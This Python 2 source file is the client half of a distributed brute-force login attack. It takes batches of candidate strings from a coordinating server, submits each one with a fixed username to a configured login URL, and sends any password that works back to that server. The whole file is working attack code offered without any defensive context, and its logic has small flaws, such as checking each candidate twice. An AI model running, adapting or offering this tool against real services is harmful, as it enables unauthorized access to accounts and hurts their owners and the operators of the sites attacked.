import socket
import select
import configuration
import struct
import requests
 
def increment_string(s, num=1):
    ret = s
    for i in xrange(num):
        ascii_vals = [ord(char) for char in ret]
        for j in range(1, len(ascii_vals) + 1):
            if ascii_vals[-j] < ord(configuration.LAST_PRINTABLE_CHAR_IN_ASCII):
                ascii_vals[-j] += 1
                break
 
            ascii_vals[-j] = ord(configuration.FIRST_PRINTABLE_CHAR)
            if j == len(ascii_vals):
                ascii_vals.append(ord(configuration.FIRST_PRINTABLE_CHAR))
 
        ret = ''.join([chr(ascii_val) for ascii_val in ascii_vals])
 
    return ret
 
def post(username, password):
    r = requests.post(configuration.URL, data = {'username' : username, 'password': password})
    return r.text == 'good'

def generate_password_batch(start, size):
    test = start
    yield start
    for i in range(size):
        test = increment_string(test)
        yield test
 
 
# String comparer
def try_find_password_in_batch(start, batch):
    for test in generate_password_batch(start, batch):
        print post(configuration.USERNAME,test)
        if post(configuration.USERNAME,test):
            return (True,test)
 
    return (False,'')
 
 
def main():
    # what to do when found is true
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(configuration.TIMEOUT)
    ip = configuration.SERVER_IP
    port = configuration.SERVER_PORT
    found = False
    print ip
    print port
    sock.connect((ip, port))

    while True:
        print found
        sock.send(struct.pack("<?",found))

        try:
            initial_pass_len = struct.unpack("<I", sock.recv(struct.calcsize("<I")))[0]
            initial_password = sock.recv(initial_pass_len)
            batch = struct.unpack("<I", sock.recv(struct.calcsize("<I")))[0]
 
        except socket.error:
            break
 
        found, correct_pass = try_find_password_in_batch(initial_password, batch)
        print found
        sock.send(struct.pack("<?",found))
        if found:
            print correct_pass
            sock.send(struct.pack("<I", len(correct_pass)))
            sock.send(correct_pass)
            sock.recv(1024)
            #sock.close()
            break

def test():
    if try_find_password_in_batch('loloa', 500):
        print 'yes'
 
 
if __name__ == '__main__':
    main()
    # test()
